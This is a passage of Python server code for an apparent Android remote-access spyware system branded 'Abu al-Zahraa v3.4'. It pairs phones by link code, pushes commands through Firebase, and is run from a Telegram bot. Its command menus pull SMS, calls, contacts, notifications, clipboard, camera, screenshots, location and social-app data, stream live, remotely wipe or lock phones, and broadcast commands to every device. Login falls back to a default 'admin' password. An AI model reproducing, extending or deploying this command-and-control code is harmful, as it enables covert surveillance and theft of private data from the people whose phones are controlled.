    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def get_uptime():
    return int(time.time() - START_TIME)


def format_uptime(seconds):
    d = seconds // 86400
    h = (seconds % 86400) // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)

# ============================================================================
# DEVICE HELPERS
# ============================================================================

def get_devices():
    return load_json(DEVICES_FILE, [])


def save_devices(devices):
    save_json(DEVICES_FILE, devices)


def find_device(device_id):
    for d in get_devices():
        if d.get("id") == device_id:
            return d
    return None


def update_device(device_id, updates):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_id:
            d.update(updates)
            d["last_seen"] = ts()
            devices[i] = d
            save_devices(devices)
            return d
    return None


def add_device(device_data):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_data.get("id"):
            device_data["last_seen"] = ts()
            devices[i] = device_data
            save_devices(devices)
            return device_data
    device_data["last_seen"] = ts()
    device_data["created_at"] = ts()
    devices.append(device_data)
    save_devices(devices)
    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
    return device_data


def remove_device(device_id):
    devices = get_devices()
    new_devices = [d for d in devices if d.get("id") != device_id]
    if len(new_devices) == len(devices):
        return False
    save_devices(new_devices)
    append_event("Device removed", {"id": device_id})
    return True


def get_first_device():
    devices = get_devices()
    return devices[0] if devices else None


def get_device_by_token(device_id, token):
    """Look up a device by both its ID and token. Returns device dict or None."""
    devices = load_json(DEVICES_FILE, [])
    for d in devices:
        if d.get('id') == device_id and d.get('token') == token:
            return d
    return None

# ============================================================================
# COMMAND QUEUE HELPERS
# ============================================================================

def queue_command(device_id, command, params=None):
    commands = load_json(COMMANDS_FILE, [])
    cmd = {
        "id": str(uuid.uuid4())[:8],
        "device_id": device_id,
        "command": command,
        "params": params or {},
        "status": "pending",
        "created_at": ts(),
        "sent_at": None,
        "result": None,
    }
    commands.append(cmd)
    if len(commands) > 1000:
        commands = commands[-1000:]
    save_json(COMMANDS_FILE, commands)
    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
    firebase_push_command(cmd)
    return cmd


def get_pending_commands(device_id):
    commands = load_json(COMMANDS_FILE, [])
    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]


def update_command_status(cmd_id, status, result=None):
    commands = load_json(COMMANDS_FILE, [])
    for i, c in enumerate(commands):
        if c.get("id") == cmd_id:
            commands[i]["status"] = status
            commands[i]["result"] = result
            commands[i]["completed_at"] = ts()
            save_json(COMMANDS_FILE, commands)
            return commands[i]
    return None

# ============================================================================
# SESSION HELPERS
# ============================================================================

def create_session(username, password, ip="", ua=""):
    settings = load_settings()
    if password != settings.get("admin_password", "admin"):
        return None
    sessions = load_json(SESSIONS_FILE, [])
    token = secrets.token_urlsafe(32)
    session = {
        "token": token,
        "username": username,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
        "ip": ip,
        "user_agent": ua,
    }
    sessions.append(session)
    if len(sessions) > 100:
        sessions = sessions[-100:]
    save_json(SESSIONS_FILE, sessions)
    append_event("Web login", {"username": username, "ip": ip})
    return session


def validate_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    now = datetime.now(timezone.utc)
    for s in sessions:
        if s.get("token") == token:
            try:
                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                if now > expires:
                    return None
            except Exception:
                return None
            return s
    return None


def delete_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    new_sessions = [s for s in sessions if s.get("token") != token]
    save_json(SESSIONS_FILE, new_sessions)

# ============================================================================
# LINK CODE HELPERS (Firebase Realtime Database + Local)
# ============================================================================

async def check_firebase_connectivity():
    """Test Firebase connectivity and set global firebase_connected flag."""
    global firebase_connected
    if not FIREBASE_DB_SECRET:
        log.warning("FIREBASE_DB_SECRET is empty - Firebase operations will use public access rules only")
    try:
        session = get_tg_session()
        url = f"{FIREBASE_RTDB_URL}/.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            if resp.status == 200:
                firebase_connected = True
                log.info("Firebase connectivity check: OK (status=200)")
            else:
                firebase_connected = False
                log.warning("Firebase connectivity check: FAIL (status=%d)", resp.status)
    except Exception as exc:
        firebase_connected = False
        log.warning("Firebase connectivity check: UNREACHABLE (%s)", exc)
    return firebase_connected


async def firebase_get(path):
    """GET data from Firebase RTDB.
    يعمل بدون مصادقة إذا كانت القواعد تسمح بالوصول العام.
    أو مع Database Secret إذا تم تعيين FIREBASE_DB_SECRET.
    Gracefully returns None if Firebase is unavailable."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                log.debug("Firebase GET %s OK", path)
                return data
            else:
                log.warning("Firebase GET %s returned status %d", path, resp.status)
    except Exception as exc:
        log.error("Firebase GET %s failed: %s", path, exc)
    return None


async def firebase_set(path, data):
    """SET data in Firebase RTDB - with optional Database Secret auth.
    If data is None, uses DELETE instead of PUT (to properly remove the key).
    Gracefully returns False if Firebase is unavailable."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        if data is None:
            # حذف المسار بدلاً من تعيينه إلى null
            async with session.delete(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                ok = resp.status in (200, 204)
                if not ok:
                    body = await resp.text()
                    log.warning("Firebase DELETE %s failed: status=%d body=%s", path, resp.status, body[:200])
                return ok
        else:
            async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                ok = resp.status in (200, 204)
                if ok:
                    log.debug("Firebase SET %s OK", path)
                else:
                    body = await resp.text()
                    log.warning("Firebase SET %s failed: status=%d body=%s", path, resp.status, body[:200])
                return ok
    except Exception as exc:
        log.error("Firebase SET %s failed: %s", path, exc)
        return False


async def firebase_update(path, data):
    """PATCH (partial update) data in Firebase RTDB - with optional Database Secret auth.
    Gracefully returns False if Firebase is unavailable."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        async with session.patch(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            ok = resp.status in (200, 204)
            if ok:
                log.debug("Firebase UPDATE %s OK", path)
            else:
                body = await resp.text()
                log.warning("Firebase UPDATE %s failed: status=%d body=%s", path, resp.status, body[:200])
            return ok
    except Exception as exc:
        log.error("Firebase UPDATE %s failed: %s", path, exc)
        return False


def firebase_push_command(cmd):
    """Push command to Firebase so the Android app can receive it."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_firebase_push_cmd_async(cmd))
    except RuntimeError:
        # Not in async context, log warning
        log.warning("firebase_push_command called outside async context")


async def _firebase_push_cmd_async(cmd):
    """Async: Push command to Firebase /commands/{device_id}/{cmd_id}"""
    device_id = cmd.get("device_id", "")
    cmd_id = cmd.get("id", "")
    if not device_id or not cmd_id:
        return
    try:
        ok = await firebase_set(f"commands/{device_id}/{cmd_id}", {
            "id": cmd["id"],
            "device_id": cmd["device_id"],
            "command": cmd["command"],
            "params": cmd.get("params", {}),
            "status": "pending",
            "created_at": cmd["created_at"],
            "server_domain": SERVER_DOMAIN,
            "server_port": SERVER_PORT,
        })
        if ok:
            log.info("Firebase: Command %s pushed for device %s", cmd_id, device_id)
            # Schedule deletion after 60 seconds (app polls every 10s, gives plenty of time)
            async def _delayed_delete():
                await asyncio.sleep(60)
                try:
                    await firebase_set(f"commands/{device_id}/{cmd_id}", None)
                    log.info("Firebase: Command %s auto-deleted after timeout", cmd_id)
                except Exception:
                    pass
            asyncio.ensure_future(_delayed_delete())
        else:
            log.warning("Firebase: Failed to push command %s", cmd_id)
    except Exception as exc:
        log.error("Firebase push command error: %s", exc)


async def generate_link_code():
    """Generate a lifetime link code - saved to Firebase + local backup.
    كود مدى الحياة - لربط جهاز واحد فقط - متزامن مع Firebase."""
    code = secrets.token_urlsafe(6).upper()[:8]
    now = datetime.now(timezone.utc)
    entry = {
        "code": code,
        "created_at": now.isoformat(),
        "used": False,
        "device_id": None,
        "session_id": secrets.token_urlsafe(16),
    }
    # 1. حفظ محلياً (ك.backup)
    codes = load_json(LINK_CODES_FILE, [])
    codes.append(entry)
    if len(codes) > 500:
        codes = codes[-200:]
    save_json(LINK_CODES_FILE, codes)
    append_event("Link code generated", {"code": code})
    # 2. حفظ في Firebase (انتظار التأكيد)
    fb_ok = await firebase_set(f"link_codes/{code}", entry)
    if fb_ok:
        log.info("تم حفظ كود الربط %s في Firebase", code)
    else:
        log.warning("لم يتم حفظ كود الربط %s في Firebase - محفوظ محلياً فقط", code)
    return entry


async def verify_link_code(code):
    """Verify link code - checks Firebase first, then local fallback."""
    # 1. التحقق من Firebase
    fb_data = await firebase_get(f"link_codes/{code}")
    if fb_data is not None:
        if fb_data.get("used"):
            return {"ok": False, "error": "Code already used"}
        return {"ok": True, "code_entry": fb_data}
    # 2. التحقق من الملف المحلي
    codes = load_json(LINK_CODES_FILE, [])
    for entry in codes:
        if entry.get("code") == code:
            if entry.get("used"):
                return {"ok": False, "error": "Code already used"}
            return {"ok": True, "code_entry": entry}
    return {"ok": False, "error": "Invalid code"}


async def consume_link_code(code, device_id):
    """Mark link code as used in Firebase + local."""
    now = datetime.now(timezone.utc).isoformat()
    # 1. تحديث Firebase
    await firebase_update(f"link_codes/{code}", {
        "used": True,
        "device_id": device_id,
        "used_at": now,
    })
    # 2. تحديث محلي
    codes = load_json(LINK_CODES_FILE, [])
    for entry in codes:
        if entry.get("code") == code:
            entry["used"] = True
            entry["device_id"] = device_id
            entry["used_at"] = now
            save_json(LINK_CODES_FILE, codes)
            return True
    return False

# ============================================================================
# TELEGRAM API HELPERS (aiohttp only)
# ============================================================================

def get_tg_session():
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
    return _tg_session


async def tg_request(method, payload=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        session = get_tg_session()
        async with session.post(url, json=payload or {}) as resp:
            data = await resp.json()
            if not data.get("ok"):
                log.warning("TG %s error: %s", method, data.get("description", ""))
            return data
    except Exception as exc:
        log.error("TG %s failed: %s", method, exc)
        return None


async def send_message(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    global messages_sent
    # === ANTI-SPAM: Deduplication + Rate Limiting ===
    now = time.time()
    chat_key = str(chat_id)
    text_hash = hashlib.md5(text[:200].encode()).hexdigest() if text else ""

    # Check: same message to same chat within 60 seconds?
    dedup_key = f"{chat_key}:{text_hash}"
    last_sent = _message_dedup.get(dedup_key, 0)
    if now - last_sent < 10 and text_hash:
        log.warning("DEDUP BLOCKED: chat=%s hash=%s", chat_key, text_hash[:8])
        return {"ok": False, "description": "dedup_blocked"}

    # Check: more than 5 messages to same chat within 30 seconds?
    recent = _chat_rate_counter.get(chat_key, [])
    recent = [t for t in recent if now - t < 30]
    if len(recent) >= 10:
        log.warning("RATE BLOCKED: chat=%s count=%d", chat_key, len(recent))
        return {"ok": False, "description": "rate_limited"}
    recent.append(now)
    _chat_rate_counter[chat_key] = recent

    # Register in dedup table
    _message_dedup[dedup_key] = now
    expired = [k for k, v in _message_dedup.items() if now - v > 30]
    for k in expired:
        del _message_dedup[k]

    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if disable_notification:
        payload["disable_notification"] = True
    result = await tg_request("sendMessage", payload)
    if result and result.get("ok"):
        messages_sent += 1
    return result


async def send_admin(text, parse_mode="HTML", reply_markup=None):
    return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)


async def send_photo(chat_id, file_data, caption=None):
    session = get_tg_session()
    try:
        data = aiohttp.FormData()
        data.add_field("chat_id", str(chat_id))
        data.add_field("photo", file_data, filename="data.jpg")
        if caption:
            data.add_field("caption", caption)
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data) as resp:
            return await resp.json()
    except Exception as exc:
        log.error("send_photo failed: %s", exc)
        return None


async def answer_callback_query(callback_query_id, text="", show_alert=False):
    return await tg_request("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return await tg_request("editMessageText", payload)


async def update_batch_progress(batch_id):
    """Update batch operation progress message in Telegram."""
    batch = _batch_operations.get(batch_id)
    if not batch or not batch.get("msg_id"):
        return
    elapsed = int(time.time() - batch.get("created_at", time.time()))
    total = batch["total"]
    responded = batch["responded"]
    icon = "✅" if responded >= total else "⏳"
    btype = "📢 إرسال عام" if batch.get("type") == "broadcast" else "🔄 أمر جماعي"
    text = (
        f"{icon} <b>{btype}</b>\n\n"
        f"📊 التقدم: <b>{responded}/{total}</b> أجهزة استجابت\n"
        f"⏱️ الوقت: {elapsed} ثانية"
    )
    if responded >= total:
        text += f"\n\n✅ تم الانتهاء!"
    try:
        await edit_message_text(batch["chat_id"], batch["msg_id"], text)
    except Exception as e:
        log.warning("Failed to update batch progress: %s", e)

# ============================================================================
# INLINE KEYBOARD BUILDERS
# ============================================================================

def ib(text, callback_data):
    return {"text": text, "callback_data": callback_data}


def build_main_menu():
    return {
        "inline_keyboard": [
            [ib("📱 الأجهزة والربط", "menu_devices")],
            [ib("📊 جمع البيانات", "menu_data")],
            [ib("🌐 التواصل الاجتماعي", "menu_social")],
            [ib("🎮 التحكم عن بعد", "menu_control")],
            [ib("📦 إدارة التطبيقات", "menu_apps")],
            [ib("📂 إدارة الملفات", "menu_files")],
            [ib("🔒 الأمان والإدارة", "menu_security")],
            [ib("🔍 المراقبة", "menu_monitor")],
            [ib("📡 البث المباشر", "menu_streaming")],
            [ib("⚙️ إعدادات النظام", "menu_syssettings")],
            [ib("🖥️ إدارة السيرفر", "menu_server")],
            [ib("⁉️ المساعدة", "menu_help")],
        ]
    }


def build_back_button(target="back_main"):
    return {"inline_keyboard": [[ib("🔙 رجوع", target)]]}


def check_user_rate_limit(chat_id):
    """Check if user is within rate limit. Returns True if allowed, False if rate limited."""
    now = time.time()
    chat_key = str(chat_id)
    timestamps = _user_command_timestamps.get(chat_key, [])
    # Remove timestamps outside the window
    timestamps = [t for t in timestamps if now - t < USER_RATE_LIMIT_WINDOW]
    if len(timestamps) >= USER_RATE_LIMIT_MAX:
        _user_command_timestamps[chat_key] = timestamps
        return False
    timestamps.append(now)
    _user_command_timestamps[chat_key] = timestamps
    # Periodic cleanup
    if len(timestamps) == 1:
        expired_keys = [k for k, v in _user_command_timestamps.items() if not v or now - v[-1] > USER_RATE_LIMIT_WINDOW * 2]
        for k in expired_keys:
            del _user_command_timestamps[k]
    return True


def build_quick_actions_menu(device_id):
    """Build inline keyboard with quick action buttons for a device."""
    return {
        "inline_keyboard": [
            [ib("📸 لقطة شاشة", f"quick_screenshot_{device_id}"), ib("📍 الموقع", f"quick_location_{device_id}")],
            [ib("🔋 البطارية", f"quick_battery_{device_id}"), ib("ℹ️ معلومات الجهاز", f"quick_info_{device_id}")],
            [ib("📱 التطبيقات", f"quick_apps_{device_id}")],
            [ib("🔙 رجوع", f"dev_{device_id}")],
        ]
    }


def build_devices_menu():
    devices = get_devices()
    rows = []
    for d in devices:
        status = "🟢" if d.get("active") else "🔴"
        name = d.get("name", d.get("id", "مجهول"))
        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
    if not devices:
        rows.append([ib("لا توجد أجهزة مربوطة", "no_action")])
    rows.append([ib("🔗 ربط جهاز جديد", "do_link")])
    rows.append([ib("🔙 رجوع", "back_main")])
    return {"inline_keyboard": rows}


def build_device_menu(device_id):
    return {
        "inline_keyboard": [
            [ib("⚡ إجراءات سريعة", f"quick_actions_{device_id}")],
            [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
            [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
            [ib("📇 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
            [ib("📸 لقطة الشاشة", f"cmd_screenshot_{device_id}"), ib("📷 الكاميرا", f"submenu_camera_{device_id}")],
            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
            [ib("🌐 التواصل", f"submenu_social_{device_id}")],
            [ib("🎮 التحكم", f"submenu_control_{device_id}")],
            [ib("📂 الملفات", f"submenu_files_{device_id}")],
            [ib("🔒 الأمان", f"submenu_security_{device_id}")],
            [ib("🔍 المراقبة", f"submenu_monitor_{device_id}")],
            [ib("📡 البث المباشر", f"submenu_streaming_{device_id}")],
            [ib("⚙️ الإعدادات", f"submenu_syssettings_{device_id}")],
            [ib("🗑️ إلغاء الربط", f"do_unlink_{device_id}")],
            [ib("🔙 رجوع", "menu_devices")],
        ]
    }


def build_category_submenu(device_id, category):
    """Build submenu for a command category with 2-column grid."""
    items = []
    for name, info in COMMAND_REGISTRY.items():
        if info["cat"] == category:
            items.append((name, info))
    
    if not items:
        return build_back_button(f"dev_{device_id}")
    
    rows = []
    # Display in 2-column grid for cleaner layout
    for i in range(0, len(items), 2):
        row = [ib(items[i][1]["desc"], f"exec_{items[i][0]}_{device_id}")]
        if i + 1 < len(items):
            row.append(ib(items[i+1][1]["desc"], f"exec_{items[i+1][0]}_{device_id}"))
        rows.append(row)
    
    rows.append([ib("🔙 رجوع", f"dev_{device_id}")])
    return {"inline_keyboard": rows}


def build_data_submenu(device_id):
    return build_category_submenu(device_id, "data")


def build_social_submenu(device_id):
    return build_category_submenu(device_id, "social")


def build_control_submenu(device_id):
    return build_category_submenu(device_id, "control")


def build_apps_submenu(device_id):
    return build_category_submenu(device_id, "apps")


def build_files_submenu(device_id):
    return build_category_submenu(device_id, "files")


def build_security_submenu(device_id):
    return build_category_submenu(device_id, "security")


def build_monitor_submenu(device_id):
    return build_category_submenu(device_id, "monitor")


def build_syssettings_submenu(device_id):
    return build_category_submenu(device_id, "syssettings")


def build_streaming_submenu(device_id):
    return build_category_submenu(device_id, "streaming")


def build_server_menu():
    return {
        "inline_keyboard": [
            [ib("📊 حالة السيرفر", "srv_status")],
            [ib("📈 الإحصائيات", "srv_stats")],
            [ib("📝 سجل الأحداث", "srv_logs")],
            [ib("⚙️ الإعدادات", "srv_settings")],
            [ib("🔑 تغيير كلمة المرور", "srv_setpass")],
            [ib("➕ إضافة أدمن", "srv_addadmin")],
            [ib("📢 إرسال عام", "srv_broadcast")],
            [ib("💾 نسخ احتياطي", "srv_backup")],
            [ib("📤 تصدير", "srv_export")],
            [ib("📥 استيراد", "srv_import")],
            [ib("🗑️ مسح البيانات", "srv_cleardata")],
            [ib("🔄 إعادة تشغيل", "srv_restart")],
            [ib("🔧 الصيانة", "srv_maintenance")],
            [ib("🔙 رجوع", "back_main")],
        ]
    }


def build_help_menu():
    total = len(COMMAND_REGISTRY)
    cats = OrderedDict()
    for name, info in COMMAND_REGISTRY.items():
        cat = info["cat"]
        if cat not in cats:
            cats[cat] = []
        cats[cat].append(info)
    
    text = f"📖 <b>دليل الأوامر - أبو الزهراء</b>\n\nالإجمالي: <b>{total}</b> أوامر\n\n"
    cat_names = {
        "data": "📊 جمع البيانات", "social": "🌐 التواصل الاجتماعي",
        "control": "🎮 التحكم عن بعد", "apps": "📦 إدارة التطبيقات",
        "files": "📂 إدارة الملفات", "security": "🔒 الأمان",
        "monitor": "🔍 المراقبة", "syssettings": "⚙️ إعدادات النظام",
        "streaming": "📡 البث المباشر",
    }
    for cat, items in cats.items():
        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
        for item in items[:3]:
            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
        if len(items) > 3:
            text += f"  ...+{len(items)-3} more\n"
        text += "\n"
    
    text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
    text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
    text += "🔍 /search - بحث الأجهزة\n📊 /stats - الإحصائيات\n"
    text += "🔄 /all - أمر جماعي\n📢 /broadcast - إرسال عام\n"
    return text

# ============================================================================
# COMMAND EXECUTOR
# ============================================================================

async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
    """Queue a command for a device and notify admin."""
    if not device_id or device_id == "none":
        await send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /link أولاً.", reply_markup=build_main_menu())
        return
    
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود.", reply_markup=build_main_menu())
        return
    
    cmd = queue_command(device_id, cmd_name, params)
    reg = COMMAND_REGISTRY.get(cmd_name, {})
    desc = reg.get("desc", cmd_name)
    emoji = reg.get("emoji", "📋")
    
    text = (
        f"⏳ <b>جاري تنفيذ الأمر...</b>\n\n"
        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
        f"📋 الأمر: {desc}\n"
        f"🆔 المعرف: <code>{cmd['id']}</code>\n\n"
        f"⏳ بانتظار استجابة الجهاز..."
    )
    
    kb = build_device_menu(device_id)
    
    # Save pending message reference for result updates
    pending_msg_id = msg_id  # If editing existing message, use its ID
    if msg_id:
        resp = await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
        if not resp or not resp.get("ok"):
            # Edit failed (e.g., message too old), send new message
            resp = await send_message(chat_id, text, reply_markup=kb)
            if resp and resp.get("ok"):
                pending_msg_id = resp["result"]["message_id"]
    else:
        resp = await send_message(chat_id, text, reply_markup=kb)
        if resp and resp.get("ok"):
            pending_msg_id = resp["result"]["message_id"]
    
    # Track this pending message so we can edit it when result arrives
    if pending_msg_id:
        _pending_messages[cmd["id"]] = {"chat_id": chat_id, "message_id": pending_msg_id, "created_at": time.time()}
        log.info("Tracking pending message: cmd_id=%s msg_id=%d chat_id=%s", cmd["id"], pending_msg_id, chat_id)

# ============================================================================
# TELEGRAM COMMAND HANDLER
# ============================================================================

async def handle_telegram_command(chat_id, text, message_id=None):
    parts = text.strip().split(maxsplit=3)
    cmd = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []
    arg1 = args[0] if args else ""
    arg2 = args[1] if len(args) > 1 else ""

    # === منع إرسال رسائل مكررة (Rate Limiting) ===
    now = time.time()
    last_time = _last_message_time.get(chat_id, 0)
    if now - last_time < RATE_LIMIT_SECONDS:
        log.warning("Rate limited: %s from %s", cmd, chat_id)
        return
    _last_message_time[chat_id] = now

    # === Per-user rate limiting (20 commands per minute) ===
    if not check_user_rate_limit(chat_id):
        await send_message(chat_id, f"⏳ <b>تم تقييد السرعة</b>\n\nأنت تجاوزت الحد المسموح ({USER_RATE_LIMIT_MAX} أمر/دقيقة).\nيرجى الانتظار قليلاً ثم المحاولة مرة أخرى.", reply_markup=build_back_button())
        return

    # Resolve device_id
    dev_id = arg1
    if not dev_id or not find_device(dev_id):
        d = get_first_device()
        dev_id = d["id"] if d else ""

    log.info("CMD %s from %s: %s", cmd, chat_id, args)
    append_event("Telegram command", {"command": cmd, "args": args})

    # ── Utility Commands ──
    if cmd == "/start":
        await handle_start(chat_id)
    elif cmd == "/help":
        text = build_help_menu()
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/menu":
        await send_message(chat_id, "📋 <b>القائمة الرئيسية</b>\nاختر تصنيفاً:", reply_markup=build_main_menu())
    elif cmd == "/status":
        await handle_status(chat_id)
    elif cmd == "/about":
        await send_message(chat_id, (
            "🟥 <b>سيرفر أبو الزهراء v3.4</b>\n\n"
            "نظام إدارة الأجهزة المتكامل\n"
            f"النطاق: <code>{SERVER_DOMAIN}</code>\n"
            f"المنفذ: <code>{SERVER_PORT}</code>\n"
            f"الأوامر: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"وقت التشغيل: <code>{format_uptime(get_uptime())}</code>"
        ), reply_markup=build_back_button())
    elif cmd == "/version":
        await send_message(chat_id, "🟥 <b>أبو الزهراء v3.4</b>\nالإصدار: 2025.03\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
    elif cmd == "/test":
        await send_message(chat_id, "✅ السيرفر يعمل!\n🟢 جميع الأنظمة تعمل.", reply_markup=build_back_button())

    # ── Device Management ──
    elif cmd == "/devices":
        await handle_devices(chat_id)
    elif cmd == "/link":
        await handle_link(chat_id)
    elif cmd == "/unlink":
        await handle_unlink(chat_id, arg1)
    elif cmd == "/device":
        await handle_device_detail(chat_id, arg1)
    elif cmd == "/device_rename":
        if arg1 and arg2:
            if update_device(arg1, {"name": arg2}):
                await send_message(chat_id, f"✅ تم إعادة تسمية الجهاز إلى <code>{arg2}</code>", reply_markup=build_back_button())
            else:
                await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "الاستخدام: /device_rename معرف_الجهاز الاسم_الجديد", reply_markup=build_back_button())
    elif cmd == "/device_wipe":
        await execute_device_command(chat_id, dev_id, "wipe_data")
    elif cmd == "/device_locate":
        await execute_device_command(chat_id, dev_id, "get_location")
    elif cmd == "/device_lock":
        await execute_device_command(chat_id, dev_id, "lock_phone")
    elif cmd == "/device_ring":
        await execute_device_command(chat_id, dev_id, "ring")
    elif cmd == "/device_settings":
        d = find_device(dev_id)
        if d:
            await send_message(chat_id, f"⚙️ الإعدادات لجهاز <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())

    # ── Server Management ──
    elif cmd == "/server_status":
        await handle_status(chat_id)
    elif cmd == "/server_restart":
        await send_admin("🔄 تم طلب إعادة تشغيل السيرفر...")
        append_event("Server restart requested")
    elif cmd == "/clear_data":
        save_json(COMMANDS_FILE, [])
        save_json(EVENTS_FILE, [])
        await send_admin("✅ تم مسح قائمة الأوامر والأحداث", reply_markup=build_back_button())
    elif cmd == "/backup":
        await send_admin("💾 جارٍ إنشاء نسخة احتياطية...", reply_markup=build_back_button())
        append_event("Backup created")
    elif cmd == "/export":
        await send_admin("📤 بدأ التصدير", reply_markup=build_back_button())
    elif cmd == "/import":
        await send_admin("📥 جاهز للاستيراد", reply_markup=build_back_button())
    elif cmd == "/stats":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        cmds = load_json(COMMANDS_FILE, [])
        events = load_json(EVENTS_FILE, [])
        today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        cmds_today = sum(1 for c in cmds if c.get("created_at", "").startswith(today_str))
        events_today = sum(1 for e in events if e.get("time", "").startswith(today_str))
        pending = sum(1 for c in cmds if c.get("status") == "pending")
        done = sum(1 for c in cmds if c.get("status") in ("completed", "success"))
        text = (
            "📊 <b>لوحة الإحصائيات</b>\n\n"
            f"📱 الأجهزة: <b>{len(devices)}</b> (🟢 {online} متصل | 🔴 {len(devices)-online} غير متصل)\n"
            f"📋 الأوامر اليوم: <b>{cmds_today}</b>\n"
            f"⏳ معلّق: {pending} | ✅ مكتمل: {done}\n"
            f"📝 الأحداث اليوم: <b>{events_today}</b>\n"
            f"📨 الرسائل المرسلة: {messages_sent}\n"
            f"📡 طلبات API: {api_hits}\n"
            f"⏱️ وقت التشغيل: <b>{format_uptime(get_uptime())}</b>\n"
            f"🖥️ الإصدار: <b>v3.4</b>"
        )
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/search":
        query = " ".join(parts[1:]) if len(parts) > 1 else ""
        if not query:
            await send_message(chat_id, "🔍 <b>بحث الأجهزة</b>\n\nالاستخدام: /search <كلمة البحث>\n\nيبحث بالاسم، الموديل، أو معرف الجهاز.", reply_markup=build_back_button())
            return
        devices = get_devices()
        query_lower = query.lower()
        results = [d for d in devices if
                   query_lower in d.get("name", "").lower() or
                   query_lower in d.get("model", "").lower() or
                   query_lower in d.get("id", "").lower() or
                   query_lower in d.get("brand", "").lower()]
        if not results:
            await send_message(chat_id, f"🔍 لم يتم العثور على أجهزة تطابق: <code>{query}</code>", reply_markup=build_back_button())
        else:
            kb_rows = []
            for d in results:
                status = "🟢" if d.get("active") else "🔴"
                name = d.get("name", d.get("id", "مجهول"))
                model = d.get("model", "")
                label = f"{status} {name}"
                if model and model != name:
                    label += f" ({model})"
                kb_rows.append([ib(label, f"dev_{d['id']}")])
            kb_rows.append([ib("🔙 رجوع", "back_main")])
            await send_message(chat_id, f"🔍 <b>نتائج البحث</b> ({len(results)} جهاز)\n\nكلمة البحث: <code>{query}</code>", reply_markup={"inline_keyboard": kb_rows})
    elif cmd == "/logs":
        events = load_json(EVENTS_FILE, [])[-20:]
        text = "📝 <b>السجلات الأخيرة</b>\n\n"
        for e in events:
            text += f"[{e.get('time','')}] {e.get('event','')}\n"
